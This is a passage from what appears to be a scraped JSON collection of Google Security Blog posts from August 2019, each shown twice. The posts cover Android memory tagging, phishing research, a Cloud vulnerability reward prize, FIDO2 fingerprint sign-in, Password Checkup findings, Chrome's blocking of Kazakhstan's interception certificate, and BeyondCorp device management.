bugs, common in C and C++, remain one of the largest vulnerabilities in the Android platform and although there have been previous hardening efforts, memory safety bugs comprised more than half of the high priority security bugs in Android 9. Additionally, memory safety bugs manifest as hard to diagnose reliability problems, including sporadic crashes or silent data corruption. This reduces user satisfaction and increases the cost of software development. Software testing tools, such as ASAN and HWASAN help, but their applicability on current hardware is limited due to noticeable overheads.   MTE, a hardware feature, aims to further mitigate these memory safety bugs by enabling us to detect them with low overhead. It has two execution modes:     Precise mode: Provides more detailed information about the memory violation  Imprecise mode: Has lower CPU overhead and is more suitable to be always-on.     Arm recently published a whitepaper on MTE and has added documentation to the Arm v8.5 Architecture Reference Manual.    We envision several different usage modes for MTE.     MTE provides a version of ASAN/HWASAN that is easier to use for testing and fuzzing in laboratory environments. It will find more bugs in a fraction of the time and at a lower cost, reducing the complexity of the development process. In many cases, MTE will allow testing memory safety using the same binary as shipped to production. The bug reports produced by MTE will be as detailed and actionable as those from ASAN and HWASAN.   MTE will be used as a mechanism for testing complex software scenarios in production. App Developers and OEMs will be able to selectively turn on MTE for parts of the software stack. Where users have provided consent, bug reports will be available to developers via familiar mechanisms like Google Play Console.   MTE can be used as a strong security mitigation in the Android System and applications for many classes of memory safety bugs. For most instances of such vulnerabilities, a probabilistic mitigation based on MTE could prevent exploitation with a higher than 90% chance of detecting each invalid memory access. By implementing these protections and ensuring that attackers can't make repeated attempts to exploit security-critical components, we can significantly reduce the risk to users posed by memory safety issues.     We believe that memory tagging will detect the most common classes of memory safety bugs in the wild, helping vendors identify and fix them, discouraging malicious actors from exploiting them. During the past year, our team has been working to ensure readiness of the Android platform and application software for MTE. We have deployed HWASAN, a software implementation of the memory tagging concept, to test our entire platform and a few select apps. This deployment has uncovered close to 100 memory safety bugs. The majority of these bugs were detected on HWASAN enabled phones in everyday use. MTE will greatly improve upon this in terms of overhead, ease of deployment, and scale. In parallel, we have been working on supporting MTE in the LLVM compiler toolchain and in the Linux kernel. The Android platform support for MTE will be complete by the time of silicon availability.    Google is committed to supporting MTE throughout the Android software stack. We are working with select Arm System On Chip (SoC) partners to test MTE support and look forward to wider deployment of MTE in the Android software and hardware ecosystem. Based on the current data points, MTE provides tremendous benefits at acceptable performance costs. We are considering MTE as a possible foundational requirement for certain tiers of Android devices.    Thank you to Mitch Phillips, Evgenii Stepanov, Vlad Tsyrklevich, Mark Brand, and Serban Constantinescu for their contributions to this post.      ", "date": "August 2, 2019"},
{"website": "Google-Security", "title": "\nUnderstanding why phishing attacks are so effective and how to mitigate them\n", "author": ["Posted by", " "], "link": "https://security.googleblog.com/2019/08/understanding-why-phishing-attacks-are.html", "abstract": "                               Posted by  &nbsp;   Elie Bursztein, Security &amp; Anti-abuse Research Lead, Daniela Oliveira, Professor at the University of Florida                      Phishing attacks continue to be one of the common forms of account compromise threats.&nbsp;Every day, Gmail blocks more than 100 million phishing emails and Google Safe Browsing helps protect more than 4 billion devices against dangerous sites.&nbsp;                As part of our ongoing efforts to further protect users from phishing, we&#8217;re partnering with&nbsp;    Daniela Oliveira    from the University of Florida during a    talk at Black Hat 2019    to explore the reasons why social engineering attacks remain effective phishing tactics, even though they have been around for decades.                         Overall, the research finds&nbsp;there are a few key factors that make phishing an effective attack vector:        Phishing is constantly evolving  : 68% of the phishing emails blocked by Gmail today are new variations that were never seen before. This fast pace adversarial evolution requires humans and machines to adapt very quickly to prevent them.     Phishing is targeted:&nbsp;   Many of the campaigns targeting Gmail end-users and enterprise consumers only target a few dozen individuals. Enterprise users being 4.8x more targeted than end-users.     Phishers are persuasion experts  : As highlighted by    Daniela&#8217;s research    with Natalie Ebner   et al.   at the University of Florida, phishers have mastered the use of persuasion techniques, emotional salience and&nbsp; gain or loss framing to trick users into reacting to phishing emails.     45%&nbsp;of users don&#8217;t understand what phishing is:   After surveying Internet users, we found that 45% of them do not&nbsp; understand what phishing is or the risk associated with it. This lack of awareness increases the risk of being phished and potentially hinders the adoption of 2-step verification.&nbsp;                          Protecting users against phishing requires a layered defense approach that includes:        Educating users   about phishing so they understand what it is, how to detect it and how to protect themselves.     Leveraging the recent advances in AI   to build robust phishing detections that can keep pace with fast&nbsp; evolving phishing campaigns.     Displaying actionable phishing warnings   that are easy to understand by users so they know how to react when they see them.     Using strong two factor authentication   makes it more difficult&nbsp; for phishers to compromise accounts.&nbsp;Two-factor technologies, as visible in the graph above, can be effective against the various forms of phishing, which highlights the importance of driving awareness and adoption among users.&nbsp;&nbsp;         While technologies to help mitigate phishing exist, such as FIDO standard security keys, there is still work to be done to help users increase awareness understand how to protect themselves against phishing.                                             Posted by Elie Bursztein, Security & Anti-abuse Research Lead, Daniela Oliveira, Professor at the University of Florida     Phishing attacks continue to be one of the common forms of account compromise threats. Every day, Gmail blocks more than 100 million phishing emails and Google Safe Browsing helps protect more than 4 billion devices against dangerous sites.     As part of our ongoing efforts to further protect users from phishing, we’re partnering with  Daniela Oliveira from the University of Florida during a talk at Black Hat 2019 to explore the reasons why social engineering attacks remain effective phishing tactics, even though they have been around for decades.       Overall, the research finds there are a few key factors that make phishing an effective attack vector:  Phishing is constantly evolving: 68% of the phishing emails blocked by Gmail today are new variations that were never seen before. This fast pace adversarial evolution requires humans and machines to adapt very quickly to prevent them. Phishing is targeted:  Many of the campaigns targeting Gmail end-users and enterprise consumers only target a few dozen individuals. Enterprise users being 4.8x more targeted than end-users. Phishers are persuasion experts: As highlighted by Daniela’s research with Natalie Ebner et al. at the University of Florida, phishers have mastered the use of persuasion techniques, emotional salience and  gain or loss framing to trick users into reacting to phishing emails. 45% of users don’t understand what phishing is: After surveying Internet users, we found that 45% of them do not  understand what phishing is or the risk associated with it. This lack of awareness increases the risk of being phished and potentially hinders the adoption of 2-step verification.          Protecting users against phishing requires a layered defense approach that includes:  Educating users about phishing so they understand what it is, how to detect it and how to protect themselves. Leveraging the recent advances in AI to build robust phishing detections that can keep pace with fast  evolving phishing campaigns. Displaying actionable phishing warnings that are easy to understand by users so they know how to react when they see them. Using strong two factor authentication makes it more difficult  for phishers to compromise accounts. Two-factor technologies, as visible in the graph above, can be effective against the various forms of phishing, which highlights the importance of driving awareness and adoption among users.     While technologies to help mitigate phishing exist, such as FIDO standard security keys, there is still work to be done to help users increase awareness understand how to protect themselves against phishing.      ", "date": "August 8, 2019"},
{"website": "Google-Security", "title": "\nAwarding Google Cloud Vulnerability Research\n", "author": ["Posted by Felix Groebert, Information Security Engineering"], "link": "https://security.googleblog.com/2019/08/awarding-google-cloud-vulnerability.html", "abstract": "                             Posted by Felix Groebert, Information Security Engineering     Today, we&#8217;re excited to announce a yearly Google Cloud Platform (GCP) VRP Prize to promote security research of GCP. A prize of $100,000.00 will be paid to the reporter of the best vulnerability affecting GCP reported through our Vulnerability Reward Program ( g.co/vulnz ) and having a public write-up (nominations will be received  here ).    We&#8217;ve received vulnerability reports for various application security flaws in GCP over the years, but we felt research of our Cloud platform has been under-represented in our Vulnerability Reward Program. So, with the GCP VRP Prize, we hope to encourage even more researchers to focus on GCP products and help us identify even more security vulnerabilities.    Note that we will continue to pay hundreds of thousands of dollars to our top bug hunters through our  Vulnerability Research Grants Program  even when no bugs are found, and to reward  up to tens of thousands of dollars per bug  to the most impactful findings. This prize is meant to create an additional incentive for more people to focus on public, open security research on GCP who would otherwise not participate in the reward program.    This competition draws on our previous contests, such as  Pwnium  and the  Project Zero Prize , and rather than focusing bug hunters on collecting vulnerabilities for complex bug chains, we are attempting a slightly different twist and selecting a single winner out of all vulnerabilities we receive. That said, this approach comes with its own challenges, such as: defining the right incentives for bug hunters (both in terms of research as well as their communications with our team when reporting vulnerabilities); or ensuring there are no conflicting incentives, either when our own team is looking for similar vulnerabilities (since we aren't eligible for collecting the prize).    For the rest of the year, we will be seeking feedback from our top bug hunters and the security community to help define what vulnerabilities are the most significant, and we hope we can work together to find the best way to incentivize, recognize, and reward open security research. To further incentivize research in 2019, we will be issuing GCP VRP grants summing up to $100,000 to our top 2018 researchers.    Head over  here  for the full details on the contest. Note that if you have budget constraints for access to testing environments, you can use the  free tier of GCP .    We look forward to our Vulnerability Rewards Programs resulting in even more GCP customer protection in the following years thanks to the hard work of the security research community. Follow us on @GoogleVRP.                                   Posted by Felix Groebert, Information Security Engineering  Today, we’re excited to announce a yearly Google Cloud Platform (GCP) VRP Prize to promote security research of GCP. A prize of $100,000.00 will be paid to the reporter of the best vulnerability affecting GCP reported through our Vulnerability Reward Program (g.co/vulnz) and having a public write-up (nominations will be received here).  We’ve received vulnerability reports for various application security flaws in GCP over the years, but we felt research of our Cloud platform has been under-represented in our Vulnerability Reward Program. So, with the GCP VRP Prize, we hope to encourage even more researchers to focus on GCP products and help us identify even more security vulnerabilities.  Note that we will continue to pay hundreds of thousands of dollars to our top bug hunters through our Vulnerability Research Grants Program even when no bugs are found, and to reward up to tens of thousands of dollars per bug to the most impactful findings. This prize is meant to create an additional incentive for more people to focus on public, open security research on GCP who would otherwise not participate in the reward program.  This competition draws on our previous contests, such as Pwnium and the Project Zero Prize, and rather than focusing bug hunters on collecting vulnerabilities for complex bug chains, we are attempting a slightly different twist and selecting a single winner out of all vulnerabilities we receive. That said, this approach comes with its own challenges, such as: defining the right incentives for bug hunters (both in terms of research as well as their communications with our team when reporting vulnerabilities); or ensuring there are no conflicting incentives, either when our own team is looking for similar vulnerabilities (since we aren't eligible for collecting the prize).  For the rest of the year, we will be seeking feedback from our top bug hunters and the security community to help define what vulnerabilities are the most significant, and we hope we can work together to find the best way to incentivize, recognize, and reward open security research. To further incentivize research in 2019, we will be issuing GCP VRP grants summing up to $100,000 to our top 2018 researchers.  Head over here for the full details on the contest. Note that if you have budget constraints for access to testing environments, you can use the free tier of GCP.  We look forward to our Vulnerability Rewards Programs resulting in even more GCP customer protection in the following years thanks to the hard work of the security research community. Follow us on @GoogleVRP.     ", "date": "August 8, 2019"},
{"website": "Google-Security", "title": "\nMaking authentication even easier with FIDO2-based local user verification for Google Accounts\n", "author": ["Posted by Dongjing He, Software Engineer and Christiaan Brand, Product Manager "], "link": "https://security.googleblog.com/2019/08/making-authentication-even-easier-with_12.html", "abstract": "                             Posted by Dongjing He, Software Engineer and Christiaan Brand, Product Manager&nbsp;        Passwords, combined with Google's automated protections, help secure billions of users around the world. But, new security technologies are surpassing passwords in terms of both strength and convenience. With this in mind, we are happy to announce that you can verify your identity by using your fingerprint or screen lock instead of a password when visiting certain Google services. The feature is available today on Pixel devices and coming to all Android 7+ devices over the next few days.                           Simpler authentication experience when viewing your saved password for a website on passwords.google.com       These enhancements are built using the  FIDO2  standards,  W3C WebAuthn  and  FIDO CTAP , and are designed to provide simpler and more secure authentication experiences. They are a result of years of collaboration between Google and many other organizations in the FIDO Alliance and the W3C.   An important benefit of using FIDO2 versus interacting with the native fingerprint APIs on Android is that these biometric capabilities are now, for the first time, available on the web, allowing the same credentials be used by both native apps and web services. This means that a user only has to register their fingerprint with a service once and then the fingerprint will work for both the native application and the web service.  Note that your fingerprint is never sent to Google&#8217;s servers - it is securely stored on your device, and only a cryptographic proof that you&#8217;ve correctly scanned it is sent to Google&#8217;s servers. This is a  fundamental part of the FIDO2 design .      Here is how it works            Google is using the  FIDO2 capability on Android  to register a platform-bound FIDO credential. We remember the credential for that specific Android device. Now, when the user visits a compatible service, such as passwords.google.com, we issue a WebAuthn &#8220;Get&#8221; call, passing in the credentialId that we got when creating the credential. The result is a valid FIDO2 signature.                             High-level architecture of using fingerprint or screen lock on Android devices to verify a user&#8217;s identity without a password       Please follow the instructions below if you&#8217;d like to try it out.  Prerequisites    Phone is running Android 7.0 (Nougat) or later   Your personal Google Account is added to your Android device    Valid screen lock is set up on your Android device    To try it   Open the Chrome app on your Android device   Navigate to  https://passwords.google.com    Choose a site to view or manage a saved password   Follow the instructions to confirm that it&#8217;s you trying signing in    You can find more detailed instructions  here .    For additional security  Remember, Google's automated defenses securely block the overwhelming majority of sign-in attempts even if an attacker has your username or password. Further, you can protect your accounts with two-step verification (2SV), including  Titan Security Keys  and  Android phone&#8217;s built-in security key .  Both security keys and local user verification based on biometrics use the FIDO2 standards. However, these two protections address different use cases. Security keys are used for bootstrapping a new device as a second factor as part of 2SV in order to make sure it&#8217;s the right owner of the account accessing it. Local user verification based on biometrics comes after bootstrapping a device and can be used for re-authentication during step-up flows to verify the identity of the already signed-in user.                What&#8217;s next           This new capability marks another step on our journey to making authentication safer and easier for everyone to use. As we continue to embrace the FIDO2 standard, you will start seeing more places where local alternatives to passwords are accepted as an authentication mechanism for Google and Google Cloud services. Check out  this presentation  to get an early glimpse of the use cases that we are working to enable next.                                      Posted by Dongjing He, Software Engineer and Christiaan Brand, Product Manager   Passwords, combined with Google's automated protections, help secure billions of users around the world. But, new security technologies are surpassing passwords in terms of both strength and convenience. With this in mind, we are happy to announce that you can verify your identity by using your fingerprint or screen lock instead of a password when visiting certain Google services. The feature is available today on Pixel devices and coming to all Android 7+ devices over the next few days.       Simpler authentication experience when viewing your saved password for a website on passwords.google.com These enhancements are built using the FIDO2 standards, W3C WebAuthn and FIDO CTAP, and are designed to provide simpler and more secure authentication experiences. They are a result of years of collaboration between Google and many other organizations in the FIDO Alliance and the W3C. An important benefit of using FIDO2 versus interacting with the native fingerprint APIs on Android is that these biometric capabilities are now, for the first time, available on the web, allowing the same credentials be used by both native apps and web services. This means that a user only has to register their fingerprint with a service once and then the fingerprint will work for both the native application and the web service.Note that your fingerprint is never sent to Google’s servers - it is securely stored on your device, and only a cryptographic proof that you’ve correctly scanned it is sent to Google’s servers. This is a fundamental part of the FIDO2 design. Here is how it works  Google is using the FIDO2 capability on Android to register a platform-bound FIDO credential. We remember the credential for that specific Android device. Now, when the user visits a compatible service, such as passwords.google.com, we issue a WebAuthn “Get” call, passing in the credentialId that we got when creating the credential. The result is a valid FIDO2 signature.         High-level architecture of using fingerprint or screen lock on Android devices to verify a user’s identity without a password Please follow the instructions below if you’d like to try it out.Prerequisites Phone is running Android 7.0 (Nougat) or later Your personal Google Account is added to your Android device  Valid screen lock is set up on your Android device  To try it Open the Chrome app on your Android device Navigate to https://passwords.google.com Choose a site to view or manage a saved password Follow the instructions to confirm that it’s you trying signing in  You can find more detailed instructions here.For additional securityRemember, Google's automated defenses securely block the overwhelming majority of sign-in attempts even if an attacker has your username or password. Further, you can protect your accounts with two-step verification (2SV), including Titan Security Keys and Android phone’s built-in security key.Both security keys and local user verification based on biometrics use the FIDO2 standards. However, these two protections address different use cases. Security keys are used for bootstrapping a new device as a second factor as part of 2SV in order to make sure it’s the right owner of the account accessing it. Local user verification based on biometrics comes after bootstrapping a device and can be used for re-authentication during step-up flows to verify the identity of the already signed-in user.    What’s next  This new capability marks another step on our journey to making authentication safer and easier for everyone to use. As we continue to embrace the FIDO2 standard, you will start seeing more places where local alternatives to passwords are accepted as an authentication mechanism for Google and Google Cloud services. Check out this presentation to get an early glimpse of the use cases that we are working to enable next.     ", "date": "August 12, 2019"},
{"website": "Google-Security", "title": "\nNew Research: Lessons from Password Checkup in action\n", "author": ["Posted by Jennifer Pullman, Kurt Thomas, and Elie Bursztein, Spam and Abuse research"], "link": "https://security.googleblog.com/2019/08/new-research-lessons-from-password.html", "abstract": "                             Posted by Jennifer Pullman, Kurt Thomas, and Elie Bursztein, Spam and Abuse research     Back in February, we  announced  the  Password Checkup extension  for Chrome to help keep all your online accounts safe from hijacking. The extension displays a warning whenever you sign in to a site using one of over 4 billion usernames and passwords that Google knows to be unsafe due to a  third-party data breach . Since our launch, over 650,000 people have participated in our early experiment. In the first month alone, we scanned 21 million usernames and passwords and flagged over 316,000 as unsafe---1.5% of sign-ins scanned by the extension.         Today, we are sharing our most recent lessons from the launch and announcing an updated set of features for the Password Checkup extension. Our full research study, available  here , will be presented this week as part of the  USENIX Security Symposium .     Which accounts are most at risk?       Hijackers routinely attempt to sign in to sites across the web with every credential exposed by a third-party breach. If you use  strong, unique passwords for all your accounts , this risk disappears. Based on anonymous telemetry reported by the Password Checkup extension, we found that users reused breached, unsafe credentials for some of their most sensitive financial, government, and email accounts. This risk was even more prevalent on shopping sites (where users may save credit card details), news, and entertainment sites.    In fact, outside the most popular web sites, users are 2.5X more likely to reuse vulnerable passwords, putting their account at risk of hijacking.               Anonymous telemetry reported by Password Checkup extension shows that users most often reuse vulnerable passwords on shopping, news, and entertainment sites.                Helping users re-secure their unsafe passwords       Our research shows that users opt to reset 26% of the unsafe passwords flagged by the Password Checkup extension. Even better, 60% of new passwords are secure against guessing attacks&#8212;meaning it would take an attacker over a hundred million guesses before identifying the new password.          Improving the Password Checkup extension       Today, we are also releasing two new features for the Password Checkup extension. The first is a direct feedback mechanism where users can inform us about any issues that they are facing via a quick comment box. The second gives users even more control over their data. It allows users to opt-out of the anonymous telemetry that the extension reports, including the number of lookups that surface an unsafe credential, whether an alert leads to a password change, and the domain involved for improving site coverage. By design, the Password Checkup extension ensures that Google never learns your username or password, regardless of whether you enable telemetry, but we still want to provide this option if users would prefer not to share this information.      We're continuing to improve the Password Checkup extension and exploring ways to implement its technology into Google products. For help keeping all your online accounts safe from hijacking, you can install the Password Checkup extension  here  today.                                   Posted by Jennifer Pullman, Kurt Thomas, and Elie Bursztein, Spam and Abuse research  Back in February, we announced the Password Checkup extension for Chrome to help keep all your online accounts safe from hijacking. The extension displays a warning whenever you sign in to a site using one of over 4 billion usernames and passwords that Google knows to be unsafe due to a third-party data breach. Since our launch, over 650,000 people have participated in our early experiment. In the first month alone, we scanned 21 million usernames and passwords and flagged over 316,000 as unsafe---1.5% of sign-ins scanned by the extension.   Today, we are sharing our most recent lessons from the launch and announcing an updated set of features for the Password Checkup extension. Our full research study, available here, will be presented this week as part of the USENIX Security Symposium.  Which accounts are most at risk?  Hijackers routinely attempt to sign in to sites across the web with every credential exposed by a third-party breach. If you use strong, unique passwords for all your accounts, this risk disappears. Based on anonymous telemetry reported by the Password Checkup extension, we found that users reused breached, unsafe credentials for some of their most sensitive financial, government, and email accounts. This risk was even more prevalent on shopping sites (where users may save credit card details), news, and entertainment sites.  In fact, outside the most popular web sites, users are 2.5X more likely to reuse vulnerable passwords, putting their account at risk of hijacking.   Anonymous telemetry reported by Password Checkup extension shows that users most often reuse vulnerable passwords on shopping, news, and entertainment sites.     Helping users re-secure their unsafe passwords  Our research shows that users opt to reset 26% of the unsafe passwords flagged by the Password Checkup extension. Even better, 60% of new passwords are secure against guessing attacks—meaning it would take an attacker over a hundred million guesses before identifying the new password.   Improving the Password Checkup extension  Today, we are also releasing two new features for the Password Checkup extension. The first is a direct feedback mechanism where users can inform us about any issues that they are facing via a quick comment box. The second gives users even more control over their data. It allows users to opt-out of the anonymous telemetry that the extension reports, including the number of lookups that surface an unsafe credential, whether an alert leads to a password change, and the domain involved for improving site coverage. By design, the Password Checkup extension ensures that Google never learns your username or password, regardless of whether you enable telemetry, but we still want to provide this option if users would prefer not to share this information.   We're continuing to improve the Password Checkup extension and exploring ways to implement its technology into Google products. For help keeping all your online accounts safe from hijacking, you can install the Password Checkup extension here today.     ", "date": "August 15, 2019"},
{"website": "Google-Security", "title": "\nProtecting Chrome users in Kazakhstan\n", "author": ["Posted by Andrew Whalley, Chrome Security"], "link": "https://security.googleblog.com/2019/08/protecting-chrome-users-in-kazakhstan.html", "abstract": "                             Posted by Andrew Whalley, Chrome Security     When making secure connections, Chrome trusts certificates that have been locally installed on a user's computer or mobile device. This allows users to run tools to inspect and debug connections during website development, or for corporate environments to intercept and monitor internal traffic. It is not appropriate for this mechanism to be used to intercept traffic on the public internet.    In response to  recent actions  by the Kazakhstan government, Chrome,  along with other browsers , has taken steps to protect users from the interception or modification of TLS connections made to websites.    Chrome will be blocking the certificate the Kazakhstan government required users to install:                     Common Name          Qaznet Trust Network             SHA-256 Fingerprint          00:30:9C:73:6D:D6:61:DA:6F:1E:B2:41:73:AA:84:99:44:C1:68:A4:3A:15:        BF:FD:19:2E:EC:FD:B6:F8:DB:D2             SHA-256 of Subject Public Key Info          B5:BA:8D:D7:F8:95:64:C2:88:9D:3D:64:53:C8:49:98:C7:78:24:91:9B:64:        EA:08:35:AA:62:98:65:91:BE:50                The certificate has been added to  CRLSet . No action is needed by users to be protected. In addition, the certificate  has been added  to a blocklist in the Chromium source code and thus should be included in other Chromium based browsers in due course.                                   Posted by Andrew Whalley, Chrome Security  When making secure connections, Chrome trusts certificates that have been locally installed on a user's computer or mobile device. This allows users to run tools to inspect and debug connections during website development, or for corporate environments to intercept and monitor internal traffic. It is not appropriate for this mechanism to be used to intercept traffic on the public internet.  In response to recent actions by the Kazakhstan government, Chrome, along with other browsers, has taken steps to protect users from the interception or modification of TLS connections made to websites.  Chrome will be blocking the certificate the Kazakhstan government required users to install:     Common Name  Qaznet Trust Network   SHA-256 Fingerprint  00:30:9C:73:6D:D6:61:DA:6F:1E:B2:41:73:AA:84:99:44:C1:68:A4:3A:15:  BF:FD:19:2E:EC:FD:B6:F8:DB:D2   SHA-256 of Subject Public Key Info  B5:BA:8D:D7:F8:95:64:C2:88:9D:3D:64:53:C8:49:98:C7:78:24:91:9B:64:  EA:08:35:AA:62:98:65:91:BE:50      The certificate has been added to CRLSet. No action is needed by users to be protected. In addition, the certificate has been added to a blocklist in the Chromium source code and thus should be included in other Chromium based browsers in due course.     ", "date": "August 21, 2019"},
{"website": "Google-Security", "title": "\nHow Google adopted BeyondCorp: Part 2 (devices)\n", "author": ["Posted by Matt McDonald, Software Engineer, and Sebastian Harl, Software Engineer "], "link": "https://security.googleblog.com/2019/08/how-google-adopted-beyondcorp-part-2.html", "abstract": "                             Posted by Matt McDonald, Software Engineer, and Sebastian Harl, Software Engineer&nbsp;             Intro            This is the second post in a series of four, in which we set out to revisit various  BeyondCorp  topics and share lessons that were learnt along the internal implementation path at Google.  The  first post  in this series focused on providing necessary context for how Google adopted BeyondCorp. This post will focus on managing devices - how we decide whether or not a device should be trusted and why that distinction is necessary. Device management provides both the data and guarantees required for making access decisions by securing the endpoints and providing additional context about it.            How do we manage devices?           At Google, we use the following principles to run our device fleet securely and at scale:       Secure default settings at depth with central enforcement     Ensure a scalable process     Invest in fleet testing, monitoring, and phased rollouts     Ensure high quality data       Secure default settings    Defense in depth  requires us to layer our security defenses such that an attacker would need to pass multiple controls in an attack. To uphold this defensive position at scale, we centrally manage and measure various qualities of our devices, covering all layers of the platform;       Hardware/firmware configuration     Operating system and software     User settings and modifications      We use automated configuration management systems to continuously enforce our security and compliance policies. Independently, we observe the state of our hardware and software. This allows us to determine divergence from the expected state and verify whether it is an anomaly.  Where possible, our platforms use native OS capabilities to protect against malicious software, and we extend those capabilities across our platforms with custom and commercial tooling.           Scalable process        Google manages a fleet of several hundred thousand client devices (workstations, laptops, mobile devices) for employees who are spread across the world. We scale the engineering teams who manage these devices by relying on reviewable, repeatable, and automated backend processes and minimizing GUI-based configuration tools. By using and developing open-source software and integrating it with internal solutions, we reach a level of flexibility that allows us to manage fleets at scale without sacrificing customizability for our users. The focus is on operating system agnostic server and client solutions, where possible, to avoid duplication of effort.  Software for all platforms is provided by repositories which verify the integrity of software packages before making them available to users. The same system is used for distributing configuration settings and management tools, which enforce policies on client systems using the open-source configuration management system  Puppet , running in standalone mode. In combination, this allows us to easily scale infrastructure and management horizontally as described in more detail and with examples in one of our BeyondCorp whitepapers,  Fleet Management at Scale .  All device management policies are stored in centralized systems which allow settings to be applied both at the fleet and the individual device level. This way policy owners and device owners can manage sensible defaults or per-device overrides in the same system, allowing audits of settings and exceptions. Depending on the type of exception, they may either be managed self-service by the user, require approval from appropriate parties, or affect the trust level of the affected device. This way, we aim to guarantee user satisfaction and security simultaneously.         Fleet testing, monitoring, and phased rollouts   Applying changes at scale to a large heterogeneous fleet can be challenging. At Google, we have automated test labs which allow us to test changes before we deploy them to the fleet. Rollouts to the client fleet usually follow multiple stages and random canarying, similar to common practices with service management. Furthermore, we monitor various status attributes of our fleet which allows us to detect issues before they spread widely.   High quality data   Device management depends on the quality of device data. Both configuration and trust decisions are keyed off of inventory information. At Google, we track all devices in centralized asset management systems. This allows us to not only observe the current (runtime) state of a device, but also whether it&#8217;s a legitimate Google device. These systems store hardware attributes as well as the assignment and status of devices, which lets us match and compare prescribed values to those which are observed.  Prior to implementing BeyondCorp, we performed a fleet-wide audit to ensure the quality of inventory data, and we perform smaller audits regularly across the fleet. Automation is key to achieving this, both for entering data initially and for detecting divergence at later points. For example, instead of having a human enter data into the system manually, we use digital manifests and barcode scanners as much as possible.           How do we figure out whether devices are trustworthy?         After appropriate management systems have been put in place, and data quality goals have been met, the pertinent security information related to a device can be used to establish a \"trust\" decision as to whether a given action should be allowed to be performed from the device.                                     High level architecture for BeyondCorp                  This decision can be most effectively made when an abundance of information about the device is readily available. At Google, we use an aggregated data pipeline to gather information from various sources, which each contain a limited subset of knowledge about a device and its history, and make this data available at the point when a trust decision is being made.      Various systems and repositories are employed within Google to perform collection and storage of device data that is relevant to security. These include tools like asset management repositories, device management solutions, vulnerability scanners, and internal directory services, which contain information and state about the multitude of physical device types (e.g., desktops, laptops, phones, tablets), as well as virtual desktops, used by employees at the company.  Having data from these various types of information systems available when making a trust decision for a given device can certainly be advantageous. However, challenges can present themselves when attempting to correlate records from a diverse set of systems which may not have a clear, consistent way to reference the identity of a given device. The challenge of implementation has been offset by the gains in security policy flexibility and improvements in securing our data.             What lessons did we learn?   As we rolled out BeyondCorp, we iteratively improved our fleet management and inventory processes as outlined above. These improvements are based on various lessons we learned around data quality challenges.   Audit your data ahead of implementing BeyondCorp   Data quality issues and inaccuracies are almost certain to be present in an asset management system of any substantial size, and these issues must be corrected before the data can be utilized in a manner which will have a significant impact on user experience. Having the means to compare values that have been manually entered into such systems against similar data that has been collected from devices via automation can allow for the correction of discrepancies, which may interrupt the intended behavior of the system.        Prepare to encounter unforeseen data quality challenges   Numerous data incorrectness scenarios and challenging issues are likely to present themselves as the reliance on accurate data increases. For example, be prepared to encounter issues with data ingestion processes that rely on transcribing device identifier information, which is physically labeled on devices or their packaging, and may incorrectly differ from identifier data that is digitally imprinted on the device.  In addition, over reliance on the assumed uniqueness of certain device identifiers can sometimes be problematic in the rare cases where conventionally unique attributes, like serial numbers, can appear more than once in the device fleet (this can be especially exacerbated in the case of virtual desktops, where such identifiers may be chosen by a user without regard for such concerns).  Lastly, routine maintenance and hardware replacements performed on employee devices can result in ambiguous situations with regards to the \"identity\" of a device. When internal device components, like network adapters or mainboards, are found to be defective and replaced, the device's identity can be changed into a state which no longer matches the known inventory data if care is not taken to correctly reflect such changes.&nbsp;        Implement controls to maintain high quality asset inventory   After inventory data has been brought to an acceptable correctness level, mechanisms should be put into place to limit the ability for new inaccuracies to be introduced. For example, at Google, data correctness checks have been integrated into the provisioning process for new devices so that inventory records must be correct before a device can be successfully imaged with an operating system, ensuring that the device will meet required data accuracy standards before being delivered to an employee.               Next time   In the next post in this series, we will discuss a tiered access approach, how to create rule-based trust and the lessons we&#8217;ve learned through that process.  In the meantime, if you want to learn more, you can check out the  BeyondCorp research papers . In addition, getting started with BeyondCorp is now easier using zero trust solutions from  Google Cloud (context-aware access)  and other enterprise providers.   Thank you to the editors of the BeyondCorp blog post series, Puneet Goel (Product Manager), Lior Tishbi (Program Manager), and Justin McWilliams (Engineering Manager).                                     Posted by Matt McDonald, Software Engineer, and Sebastian Harl, Software Engineer    Intro   This is the second post in a series of four, in which we set out to revisit various BeyondCorp topics and share lessons that were learnt along the internal implementation path at Google.The first post in this series focused on providing necessary context for how Google adopted BeyondCorp. This post will focus on managing devices - how we decide whether or not a device should be trusted and why that distinction is necessary. Device management provides both the data and guarantees required for making access decisions by securing the endpoints and providing additional context about it.   How do we manage devices?  At Google, we use the following principles to run our device fleet securely and at scale:  Secure default settings at depth with central enforcement Ensure a scalable process Invest in fleet testing, monitoring, and phased rollouts Ensure high quality data  Secure default settingsDefense in depth requires us to layer our security defenses such that an attacker would need to pass multiple controls in an attack. To uphold this defensive position at scale, we centrally manage and measure various qualities of our devices, covering all layers of the platform;  Hardware/firmware configuration Operating system and software User settings and modifications  We use automated configuration management systems to continuously enforce our security and compliance policies. Independently, we observe the state of our hardware and software. This allows us to determine divergence from the expected state and verify whether it is an anomaly.Where possible, our platforms use native OS capabilities to protect against malicious software, and we extend those capabilities across our platforms with custom and commercial tooling.  Scalable process  Google manages a fleet of several hundred thousand client devices (workstations, laptops, mobile devices) for employees who are spread across the world. We scale the engineering teams who manage these devices by relying on reviewable, repeatable, and automated backend processes and minimizing GUI-based configuration tools. By using and developing open-source software and integrating it with internal solutions, we reach a level of flexibility that allows us to manage fleets at scale without sacrificing customizability for our users. The focus is on operating system agnostic server and client solutions, where possible, to avoid duplication of effort.Software for all platforms is provided by repositories which verify the integrity of software packages before making them available to users. The same system is used for distributing configuration settings and management tools, which enforce policies on client systems using the open-source configuration management system Puppet, running in standalone mode. In combination, this allows us to easily scale infrastructure and management horizontally as described in more detail and with examples in one of our BeyondCorp whitepapers, Fleet Management at Scale.All device management policies are stored in centralized systems which allow settings to be applied both at the fleet and the individual device level. This way policy owners and device owners can manage sensible defaults or per-device overrides in the same system, allowing audits of settings and exceptions. Depending on the type of exception, they may either be managed self-service by the user, require approval from appropriate parties, or affect the trust level of the affected device. This way, we aim to guarantee user satisfaction and security simultaneously.  Fleet testing, monitoring, and phased rolloutsApplying changes at scale to a large heterogeneous fleet can be challenging. At Google, we have automated test labs which allow us to test changes before we deploy them to the fleet. Rollouts to the client fleet usually follow multiple stages and random canarying, similar to common practices with service management. Furthermore, we monitor various status attributes of our fleet which allows us to detect issues before they spread widely.High quality dataDevice management depends on the quality of device data. Both configuration and trust decisions are keyed off of inventory information. At Google, we track all devices in centralized asset management systems. This allows us to not only observe the current (runtime) state of a device, but also whether it’s a legitimate Google device. These systems store hardware attributes as well as the assignment and status of devices, which lets us match and compare 